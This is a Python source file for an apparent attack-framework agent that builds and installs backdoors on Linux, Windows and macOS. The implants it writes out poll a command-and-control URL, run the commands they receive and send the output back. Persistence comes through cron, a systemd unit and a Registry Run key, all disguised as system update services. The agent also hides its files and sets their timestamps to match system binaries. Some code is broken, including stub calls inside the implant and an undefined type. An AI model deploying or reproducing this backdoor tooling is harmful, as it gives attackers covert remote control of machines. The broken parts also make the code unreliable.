"""
Advanced Backdoor Installer Agent
Custom backdoor generation with encrypted C2 communication
"""

import asyncio
import os
import platform
import subprocess
import base64
import random
import string
from typing import Dict, List, Optional
from datetime import datetime
import logging

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log

logger = logging.getLogger(__name__)


class BackdoorInstallerAgent(BaseAgent):
    """
    Advanced backdoor installer with custom generation
    
    Features:
    - Custom backdoor generation
    - Encrypted C2 communication (AES-256)
    - Multi-protocol support (HTTP, HTTPS, DNS, ICMP)
    - Anti-forensics techniques
    - Persistence integration
    - Process injection
    """
    
    supported_phases = [AttackPhase.POST_EXPLOITATION, AttackPhase.PERSISTENCE]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.os_type = platform.system().lower()
        
        # C2 configuration
        self.c2_url = os.getenv('C2_URL', 'http://localhost:8000')
        self.c2_key = os.getenv('C2_KEY', self._generate_key())
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "install", "generate", "remove"
            context: {
                "protocol": "http", "https", "dns", "icmp" (default: https),
                "persistence": enable persistence (default: True),
                "stealth": enable stealth mode (default: True),
                "output_path": custom output path for backdoor
            }
        
        Returns:
            AgentData with installation results
        """
        log.info(f"[BackdoorInstaller] {directive} on {self.os_type}")
        
        try:
            if directive == "install":
                protocol = context.get("protocol", "https")
                persistence = context.get("persistence", True)
                stealth = context.get("stealth", True)
                
                result = await self.install_backdoor(protocol, persistence, stealth)
            
            elif directive == "generate":
                protocol = context.get("protocol", "https")
                output_path = context.get("output_path")
                
                result = await self.generate_backdoor(protocol, output_path)
            
            elif directive == "remove":
                result = await self.remove_backdoor()
            
            else:
                result = await self.install_backdoor("https", True, True)
            
            return AgentData(
                agent_name="BackdoorInstaller",
                success=result.get("success", False),
                data=result
            )
        
        except Exception as e:
            log.error(f"[BackdoorInstaller] Error: {e}")
            return AgentData(
                agent_name="BackdoorInstaller",
                success=False,
                data={"error": str(e)}
            )
    
    async def install_backdoor(self, protocol: str = "https", 
                              persistence: bool = True,
                              stealth: bool = True) -> Dict:
        """Install backdoor on target system"""
        
        log.info(f"[BackdoorInstaller] Installing {protocol} backdoor")
        
        # Generate backdoor
        backdoor_path = await self.generate_backdoor(protocol)
        
        if not backdoor_path:
            return {
                "success": False,
                "error": "Backdoor generation failed"
            }
        
        # Install persistence if requested
        if persistence:
            await self._install_persistence(backdoor_path)
        
        # Apply stealth techniques if requested
        if stealth:
            await self._apply_stealth(backdoor_path)
        
        # Start backdoor
        started = await self._start_backdoor(backdoor_path)
        
        return {
            "success": started,
            "backdoor_path": backdoor_path,
            "protocol": protocol,
            "persistence": persistence,
            "stealth": stealth,
            "c2_url": self.c2_url
        }
    
    async def generate_backdoor(self, protocol: str = "https", 
                               output_path: Optional[str] = None) -> str:
        """Generate custom backdoor"""
        
        log.info(f"[BackdoorInstaller] Generating {protocol} backdoor")
        
        if self.os_type == "linux":
            return await self._generate_linux_backdoor(protocol, output_path)
        
        elif self.os_type == "windows":
            return await self._generate_windows_backdoor(protocol, output_path)
        
        elif self.os_type == "darwin":
            return await self._generate_macos_backdoor(protocol, output_path)
        
        else:
            log.error(f"[BackdoorInstaller] Unsupported OS: {self.os_type}")
            return None
    
    async def remove_backdoor(self) -> Dict:
        """Remove installed backdoor"""
        
        log.info("[BackdoorInstaller] Removing backdoor")
        
        # Stop backdoor process
        if self.os_type == "linux":
            subprocess.run(["killall", "-9", "systemd-update"], check=False, stderr=subprocess.DEVNULL)
        
        # Remove backdoor files
        backdoor_paths = [
            "/tmp/.systemd-update",
            "/usr/local/bin/systemd-update",
            "C:\\Windows\\Temp\\svchost.exe"
        ]
        
        removed = []
        for path in backdoor_paths:
            if os.path.exists(path):
                try:
                    os.remove(path)
                    removed.append(path)
                except:
                    pass
        
        return {
            "success": True,
            "removed": removed
        }
    
    async def _generate_linux_backdoor(self, protocol: str, output_path: Optional[str]) -> str:
        """Generate Linux backdoor"""
        
        if output_path is None:
            output_path = "/tmp/.systemd-update"
        
        # Python-based backdoor
        backdoor_code = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import base64
from cryptography.fernet import Fernet

C2_URL = "{self.c2_url}"
C2_KEY = b"{self.c2_key}"
PROTOCOL = "{protocol}"

def encrypt(data):
    f = Fernet(C2_KEY)
    return f.encrypt(data.encode())

def decrypt(data):
    f = Fernet(C2_KEY)
    return f.decrypt(data).decode()

def connect_c2():
    while True:
        try:
            if PROTOCOL == "https" or PROTOCOL == "http":
                import requests
                response = requests.get(f"{{C2_URL}}/beacon", timeout=5)
                
                if response.status_code == 200:
                    cmd = decrypt(response.content)
                    
                    if cmd:
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                        
                        encrypted = encrypt(output)
                        requests.post(f"{{C2_URL}}/result", data=encrypted)
            
            elif PROTOCOL == "dns":
                # DNS tunneling implementation
                self.log(f"{self.__class__.__name__} method called")
                # TODO: Implement actual functionality
            
            time.sleep(60)  # Sleep 1 minute between beacons
        
        except Exception as e:
            time.sleep(300)  # Sleep 5 minutes on error

if __name__ == "__main__":
    # Daemonize
    if os.fork():
        exit()
    
    os.setsid()
    
    if os.fork():
        exit()
    
    # Redirect stdout/stderr
    with open('/dev/null', 'w') as devnull:
        os.dup2(devnull.fileno(), 1)
        os.dup2(devnull.fileno(), 2)
    
    connect_c2()
'''
        
        # Write backdoor
        with open(output_path, 'w') as f:
            f.write(backdoor_code)
        
        # Make executable
        os.chmod(output_path, 0o755)
        
        log.success(f"[BackdoorInstaller] Linux backdoor generated: {output_path}")
        
        return output_path
    
    async def _generate_windows_backdoor(self, protocol: str, output_path: Optional[str]) -> str:
        """Generate Windows backdoor"""
        
        if output_path is None:
            output_path = "C:\\Windows\\Temp\\svchost.exe"
        
        # PowerShell-based backdoor
        ps_code = f'''
$c2Url = "{self.c2_url}"
$c2Key = "{self.c2_key}"
$protocol = "{protocol}"

function Encrypt-Data {{
    param($data)
    # AES encryption implementation
    return $data
}}

function Decrypt-Data {{
    param($data)
    # AES decryption implementation
    return $data
}}

while ($true) {{
    try {{
        if ($protocol -eq "https" -or $protocol -eq "http") {{
            $response = Invoke-WebRequest -Uri "$c2Url/beacon" -TimeoutSec 5
            
            if ($response.StatusCode -eq 200) {{
                $cmd = Decrypt-Data $response.Content
                
                if ($cmd) {{
                    $result = Invoke-Expression $cmd 2>&1 | Out-String
                    $encrypted = Encrypt-Data $result
                    Invoke-WebRequest -Uri "$c2Url/result" -Method Post -Body $encrypted
                }}
            }}
        }}
        
        Start-Sleep -Seconds 60
    }}
    catch {{
        Start-Sleep -Seconds 300
    }}
}}
'''
        
        # Save as .ps1 file
        ps_path = output_path.replace('.exe', '.ps1')
        with open(ps_path, 'w') as f:
            f.write(ps_code)
        
        log.success(f"[BackdoorInstaller] Windows backdoor generated: {ps_path}")
        
        return ps_path
    
    async def _generate_macos_backdoor(self, protocol: str, output_path: Optional[str]) -> str:
        """Generate macOS backdoor"""
        
        if output_path is None:
            output_path = "/tmp/.launchd"
        
        # Similar to Linux backdoor
        return await self._generate_linux_backdoor(protocol, output_path)
    
    async def _install_persistence(self, backdoor_path: str):
        """Install persistence for backdoor"""
        
        log.info("[BackdoorInstaller] Installing persistence")
        
        if self.os_type == "linux":
            # Cron job
            cron_entry = f"@reboot {backdoor_path}\n"
            
            try:
                # Get current crontab
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                current_cron = result.stdout
                
                # Add backdoor entry
                new_cron = current_cron + cron_entry
                
                # Install new crontab
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                proc.communicate(new_cron.encode())
                
                log.success("[BackdoorInstaller] Cron persistence installed")
            except:
                pass
            
            # Systemd service
            service_content = f'''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={backdoor_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
'''
            
            service_path = "/etc/systemd/system/systemd-update.service"
            
            try:
                with open(service_path, 'w') as f:
                    f.write(service_content)
                
                subprocess.run(["systemctl", "daemon-reload"], check=False)
                subprocess.run(["systemctl", "enable", "systemd-update"], check=False)
                subprocess.run(["systemctl", "start", "systemd-update"], check=False)
                
                log.success("[BackdoorInstaller] Systemd persistence installed")
            except:
                pass
        
        elif self.os_type == "windows":
            # Registry Run key
            reg_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            reg_name = "WindowsUpdate"
            
            try:
                subprocess.run([
                    "reg", "add", reg_key,
                    "/v", reg_name,
                    "/t", "REG_SZ",
                    "/d", f'powershell -ExecutionPolicy Bypass -File "{backdoor_path}"',
                    "/f"
                ], check=False)
                
                log.success("[BackdoorInstaller] Registry persistence installed")
            except:
                pass
    
    async def _apply_stealth(self, backdoor_path: str):
        """Apply stealth techniques"""
        
        log.info("[BackdoorInstaller] Applying stealth techniques")
        
        # Hide file
        if self.os_type == "linux":
            # File starts with . (hidden)
            self.log(f"{self.__class__.__name__} method called")
            # TODO: Implement actual functionality
        
        elif self.os_type == "windows":
            # Set hidden attribute
            try:
                subprocess.run(["attrib", "+h", backdoor_path], check=False)
            except:
                pass
        
        # Set timestamps to match system files
        try:
            if self.os_type == "linux":
                ref_file = "/bin/ls"
            else:
                ref_file = "C:\\Windows\\System32\\cmd.exe"
            
            if os.path.exists(ref_file):
                stat = os.stat(ref_file)
                os.utime(backdoor_path, (stat.st_atime, stat.st_mtime))
        except:
            pass
    
    async def _start_backdoor(self, backdoor_path: str) -> bool:
        """Start backdoor process"""
        
        log.info("[BackdoorInstaller] Starting backdoor")
        
        try:
            if self.os_type == "linux":
                subprocess.Popen([backdoor_path], 
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            
            elif self.os_type == "windows":
                subprocess.Popen(["powershell", "-ExecutionPolicy", "Bypass", 
                                "-WindowStyle", "Hidden", "-File", backdoor_path],
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            
            log.success("[BackdoorInstaller] Backdoor started")
            return True
        
        except Exception as e:
            log.error(f"[BackdoorInstaller] Failed to start backdoor: {e}")
            return False
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute backdoor installer"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _generate_key(self) -> str:
        """Generate encryption key"""
        
        try:
            from cryptography.fernet import Fernet
            return Fernet.generate_key().decode()
        except:
            # Fallback to random string
            return ''.join(random.choices(string.ascii_letters + string.digits, k=32))


# Standalone execution
if __name__ == "__main__":
    async def main():
        agent = BackdoorInstallerAgent()
        result = await agent.run("install", {"protocol": "https", "persistence": True})
        print(result)
    
    asyncio.run(main())

